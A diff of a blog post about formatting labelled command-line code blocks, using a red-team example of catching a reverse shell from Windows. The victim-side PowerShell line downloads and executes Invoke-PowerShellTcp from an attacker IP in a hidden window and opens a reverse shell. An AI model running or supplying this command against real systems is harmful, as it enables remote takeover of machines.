@@ -29,12 +29,15 @@ There are many cases where such codeblocks are warranted (brackets contain remed
 - A post refers to multiple files (label)
 
 {% details "Example: Catching Reverse Shells (Labels and Command-Line)" %}
-This is really useful when presenting narratives for red teaming scenarios, where multiple machines are involved. Here are some simple notes on catching a reverse shell from a Windows machine.
+This is really useful when presenting narratives for red teaming scenarios, where multiple machines are involved.^[Not that I have any red teaming writeups, but I foresee the possibility of such posts in the future.] Here are some simple notes on catching a reverse shell from a Windows machine.
 
 1. *Get our IP.*
 
-    ```shell {data-label=Attacker .command-line data-prompt="kali@kali $"}
+    ```shell {data-label=Attacker .command-line data-prompt="kali@kali $" data-output=2-10}
     ifconfig
+    eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.100.100  netmask 255.255.255.0  broadcast 192.168.100.255
+        ...
     ```
 
 2. *Listen for incoming connections on port 4444.*
@@ -46,7 +49,7 @@ This is really useful when presenting narratives for red teaming scenarios, wher
 3. *Download and execute `Invoke-PowerShellTcp` on the victim.*
     
     ```powershell {data-label=Victim .command-line data-prompt="PS C:\>"}
-    powershell -nop -c "iex (New-Object Net.WebClient).DownloadString('http://{ATTACKER_IP}/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress {ATTACKER_IP} -Port 4444" 
+    powershell -nop -w hidden -c "iex (New-Object Net.WebClient).DownloadString('http://192.168.100.100/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.100.100 -Port 4444" 
     ```
 
 It's clear that our character shifts from Scene 1 to Scene 2, with less sentence clutter.
